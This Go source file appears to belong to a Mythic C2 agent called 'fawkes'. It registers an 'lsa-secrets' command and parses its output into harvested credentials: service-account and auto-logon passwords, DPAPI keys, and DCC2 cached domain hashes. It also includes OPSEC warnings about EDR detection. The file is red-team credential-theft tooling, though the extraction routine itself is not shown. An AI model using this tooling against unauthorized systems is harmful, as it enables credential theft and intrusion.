package agentfunctions

import (
	"fmt"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

type lsaCredential struct {
	CredType string
	Realm    string
	Account  string
	Value    string
	Comment  string
}

func parseLSACachedCredentials(responseText string) []lsaCredential {
	var creds []lsaCredential
	lines := strings.Split(responseText, "\n")
	for i := 0; i < len(lines); i++ {
		trimmed := strings.TrimSpace(lines[i])
		if strings.HasPrefix(trimmed, "[+] ") && strings.Contains(trimmed, "\\") {
			identity := strings.TrimPrefix(trimmed, "[+] ")
			parts := strings.SplitN(identity, "\\", 2)
			domain := ""
			account := identity
			if len(parts) == 2 {
				domain = parts[0]
				account = parts[1]
			}
			if i+1 < len(lines) {
				hashLine := strings.TrimSpace(lines[i+1])
				if hashLine != "" {
					creds = append(creds, lsaCredential{
						CredType: "hash",
						Realm:    domain,
						Account:  account,
						Value:    hashLine,
						Comment:  "lsa-secrets (DCC2/MSCacheV2)",
					})
				}
			}
		}
	}
	return creds
}

func classifyLSASecret(name string) (credType, comment string, include bool) {
	if strings.HasPrefix(name, "_SC_") {
		return "plaintext", "lsa-secrets (service account)", true
	} else if name == "DefaultPassword" {
		return "plaintext", "lsa-secrets (auto-logon)", true
	} else if name == "DPAPI_SYSTEM" {
		return "key", "lsa-secrets (DPAPI user:machine keys)", true
	}
	return "", "", false
}

func parseLSADumpSecrets(responseText string) []lsaCredential {
	var creds []lsaCredential
	lines := strings.Split(responseText, "\n")
	for i := 0; i < len(lines); i++ {
		trimmed := strings.TrimSpace(lines[i])
		if !strings.HasPrefix(trimmed, "[+] ") {
			continue
		}
		nameAndColon := strings.TrimPrefix(trimmed, "[+] ")
		name := strings.TrimSuffix(nameAndColon, ":")
		if name == nameAndColon {
			continue
		}
		var valueParts []string
		for j := i + 1; j < len(lines); j++ {
			nextLine := lines[j]
			if strings.HasPrefix(nextLine, "  ") || strings.HasPrefix(nextLine, "\t") {
				valueParts = append(valueParts, strings.TrimSpace(nextLine))
			} else {
				break
			}
		}
		value := strings.Join(valueParts, "\n")
		if value == "" {
			continue
		}
		credType, comment, include := classifyLSASecret(name)
		if include {
			account := name
			if strings.HasPrefix(name, "_SC_") {
				account = strings.TrimPrefix(name, "_SC_")
			}
			creds = append(creds, lsaCredential{
				CredType: credType,
				Realm:    "",
				Account:  account,
				Value:    value,
				Comment:  comment,
			})
		}
	}
	return creds
}

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name: "lsa-secrets",
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "lsa_secrets_new.js"),
			Author:     "@galoryber",
		},
		Description:         "Extract LSA secrets (service passwords, DPAPI keys, machine account) and cached domain credentials (DCC2) from the SECURITY hive. Requires SYSTEM privileges.",
		HelpString:          "lsa-secrets -action <dump|cached>",
		Version:             1,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1003.004", "T1003.005"}, // LSA Secrets, Cached Domain Credentials
		SupportedUIFeatures: []string{},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
			FilterCommandAvailabilityByAgentBuildParameters: map[string]string{"selected_os": "Windows"},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:          "action",
				CLIName:       "action",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:       []string{"dump", "cached"},
				DefaultValue:  "dump",
				Description:   "Action: dump (all LSA secrets) or cached (cached domain credentials only, DCC2 format)",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						UIModalPosition:     1,
						GroupName:           "Default",
					},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			msg := "OPSEC WARNING: "
			switch action {
			case "cached":
				msg += "Extracting cached domain credentials (DCC2/MSCacheV2) from SECURITY hive. " +
					"Requires SYSTEM privileges. Reads HKLM\\SECURITY registry — may trigger EDR alerts."
			default:
				msg += "Extracting LSA secrets (service passwords, DPAPI keys, machine account) from SECURITY hive. " +
					"Requires SYSTEM privileges. Accesses HKLM\\SECURITY and HKLM\\SYSTEM — high detection risk."
			}
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    "OPSEC AUDIT: LSA secrets extraction configured. Registry access to SECURITY hive will occur.",
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			hostname := processResponse.TaskData.Callback.Host
			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData

			if strings.Contains(responseText, "Cached Domain Credentials") {
				for _, c := range parseLSACachedCredentials(responseText) {
					creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
						CredentialType: c.CredType,
						Realm:          c.Realm,
						Account:        c.Account,
						Credential:     c.Value,
						Comment:        c.Comment,
					})
				}
			}

			if strings.Contains(responseText, "LSA Secrets") {
				for _, c := range parseLSADumpSecrets(responseText) {
					realm := c.Realm
					if realm == "" {
						realm = hostname
					}
					creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
						CredentialType: c.CredType,
						Realm:          realm,
						Account:        c.Account,
						Credential:     c.Value,
						Comment:        c.Comment,
					})
				}
			}

			registerCredentials(processResponse.TaskData.Task.ID, creds)
			if len(creds) > 0 {
				logOperationEvent(processResponse.TaskData.Task.ID,
					fmt.Sprintf("[CREDENTIAL] lsa-secrets extracted %d secrets from %s", len(creds), processResponse.TaskData.Callback.Host), true)
			}
			return response
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			action, _ := taskData.Args.GetStringArg("action")
			display := fmt.Sprintf("LSA secrets %s", action)
			response.DisplayParams = &display
			createArtifact(taskData.Task.ID, "API Call", fmt.Sprintf("LSA secret extraction via registry — %s", action))
			return response
		},
	})
}
